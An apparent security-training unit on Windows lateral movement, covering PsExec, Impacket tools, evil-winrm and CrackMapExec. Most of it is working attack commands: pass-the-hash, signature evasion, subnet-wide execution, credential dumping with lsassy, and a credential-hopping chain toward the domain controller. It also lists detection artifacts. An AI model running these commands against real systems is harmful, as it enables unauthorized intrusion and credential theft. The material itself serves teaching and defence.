# PsExec and Alternatives

## Unit 6 - Topic 4 | Lateral Movement

---

## Overview

**PsExec** is the most well-known remote execution tool, creating a service on the target to run commands as SYSTEM. While highly effective, it generates significant forensic artifacts. Understanding PsExec and its alternatives helps choose the right tool for each situation.

---

## 1. PsExec Variants

```
PSEXEC EXECUTION FLOW:

1. Connect to target's SMB (port 445)
2. Authenticate (password, hash, or ticket)
3. Upload service binary to ADMIN$ share
4. Create and start a Windows service
5. Execute command via the service
6. Return output through named pipe
7. Stop and delete the service
8. Delete the uploaded binary

ARTIFACTS GENERATED:
├── Event 4624: Type 3 logon (network auth)
├── Event 7045: New service installed
├── Event 7036: Service started/stopped
├── File creation in C:\Windows\ (briefly)
├── Named pipe creation
└── SMB traffic to ADMIN$/IPC$
```

---

## 2. PsExec Implementations

```bash
# === SYSINTERNALS PSEXEC (Original) ===
# From Windows:
PsExec.exe \\target -u corp\admin -p password cmd.exe
PsExec.exe \\target -s cmd.exe              # As SYSTEM
PsExec.exe \\target -u admin -p pass -c evil.exe  # Upload+run
PsExec.exe \\target -u admin -p pass -i -d cmd.exe  # Interactive

# === IMPACKET PSEXEC.PY (Linux) ===
psexec.py corp.local/admin:pass@target
psexec.py corp.local/admin@target -hashes :NTLM_HASH
psexec.py corp.local/admin@target -k -no-pass  # Kerberos

# Custom service name (evade static signatures):
psexec.py corp.local/admin:pass@target -service-name randomname

# Execute specific command:
psexec.py corp.local/admin:pass@target "whoami"

# === IMPACKET SMBEXEC.PY (No binary upload) ===
smbexec.py corp.local/admin:pass@target
# Doesn't upload a binary!
# Creates service that writes output to a share
# Slightly stealthier than psexec.py

# === PAExec (Open-source PsExec alternative) ===
# Similar to PsExec but different binary signature
PAExec.exe \\target -u admin -p pass cmd.exe

# === CSEXEC (Named pipe) ===
# Uses a different execution mechanism
csexec.py corp.local/admin:pass@target
```

---

## 3. Detection-Aware Alternatives

```bash
# === WMIEXEC.PY (No service creation) ===
wmiexec.py corp.local/admin:pass@target
# No service installed (avoids Event 7045)
# Output via WMI, not SMB
# Lower detection profile

# === DCOMEXEC.PY (Minimal artifacts) ===
dcomexec.py corp.local/admin:pass@target
# Uses DCOM objects for execution
# Very rarely monitored
# Objects: MMC20.Application, ShellWindows

# === ATEXEC.PY (Scheduled task) ===
atexec.py corp.local/admin:pass@target "command"
# Uses scheduled task instead of service
# Different event IDs: 4698, 4699 (task created/deleted)
# Each command = new task

# === EVIL-WINRM (WinRM — Different protocol) ===
evil-winrm -i target -u admin -p pass
# Uses WinRM (port 5985) instead of SMB (445)
# Different log sources
# Interactive PowerShell environment

# === SSH (If available) ===
# Windows 10+ / Server 2019+ may have OpenSSH
ssh admin@target
# Standard SSH — very different detection profile
```

---

## 4. Mass Lateral Movement

```bash
# === CRACKMAPEXEC (Spray + Execute) ===
# Find where you have admin:
crackmapexec smb 10.0.0.0/24 -u admin -p pass
# [+] 10.0.0.5  (Pwn3d!)
# [+] 10.0.0.10 (Pwn3d!)
# [+] 10.0.0.20 (Pwn3d!)

# Execute on all accessible hosts:
crackmapexec smb 10.0.0.0/24 -u admin -p pass \
  -x "whoami && hostname" --exec-method wmiexec

# Dump creds from all:
crackmapexec smb 10.0.0.0/24 -u admin -p pass \
  -M lsassy

# === POWERSHELL FAN-OUT ===
$targets = @("srv01","srv02","srv03")
$cred = Get-Credential
Invoke-Command -ComputerName $targets -Credential $cred \
  -ScriptBlock {
    whoami; hostname; Get-Process lsass
  }

# === LATERAL MOVEMENT CHAIN ===
# 1. Compromise Host A → dump creds
# 2. Found admin hash for Host B
# 3. PtH to Host B → dump creds
# 4. Found DA password on Host B
# 5. Use DA creds → access DC
# This "credential hopping" is typical AD attack flow
```

---

## 5. Choosing the Right Tool

| Factor | Best Choice |
|--------|-------------|
| **Need SYSTEM shell** | psexec.py, smbexec.py |
| **Stealth priority** | dcomexec.py, wmiexec.py |
| **Mass execution** | CrackMapExec |
| **Interactive shell** | evil-winrm, Enter-PSSession |
| **File transfer** | evil-winrm (upload/download) |
| **No SMB** | evil-winrm (WinRM), SSH |
| **Single command** | atexec.py |
| **Kerberos auth** | Any Impacket tool with -k |

---

## Summary Table

| Tool | Protocol | Shell Level | Detection |
|------|----------|-------------|-----------|
| **psexec.py** | SMB (445) | SYSTEM | 🔴 High |
| **smbexec.py** | SMB (445) | SYSTEM | 🟡 Medium |
| **wmiexec.py** | WMI (135) | User | 🟢 Low |
| **dcomexec.py** | DCOM (135) | User | 🟢 Low |
| **atexec.py** | SMB (445) | SYSTEM | 🟡 Medium |
| **evil-winrm** | WinRM (5985) | User | 🟡 Medium |

---

## Quick Revision Questions

1. **What artifacts does PsExec create on the target?**
2. **Why is smbexec.py stealthier than psexec.py?**
3. **When would you choose dcomexec over psexec?**
4. **What is the "credential hopping" pattern?**
5. **How does CrackMapExec facilitate mass lateral movement?**

---

[← Previous: PowerShell Remoting](03-powershell-remoting.md) | [Next: RDP Hijacking →](05-rdp-hijacking.md)

---

*Unit 6 - Topic 4 of 6 | [Back to README](../README.md)*
